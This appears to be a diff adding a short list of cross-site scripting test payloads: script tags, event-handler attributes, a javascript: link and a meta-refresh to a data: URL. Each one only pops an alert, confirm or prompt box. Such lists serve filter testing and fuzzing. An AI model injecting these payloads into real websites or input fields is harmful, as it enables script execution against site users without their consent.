@@ -1,0 +1,14 @@
+<script>aLert(8888 )</script> 
+<img src=1 onerror=alert(1)>
+<script>confirm(8888)</script>
+<script>prompt(8888)</script>
+<anytag onmouseover=alert(1)>h 
+<anytag onc Lick=alert(2)>h
+<a onmouseover=alert(3)>h
+<a onclick=alert(4)>h
+<a href=javascript:alert(5)>h
+<button/onclick=alert(6)>h
+sform onsubmit=alert(10)><button>h
+<img src=x onerror=alert(11)> 29
+<meta http-equiv="refresh" content="0;
+url=data:text/html,<script>alert(15)</script>">
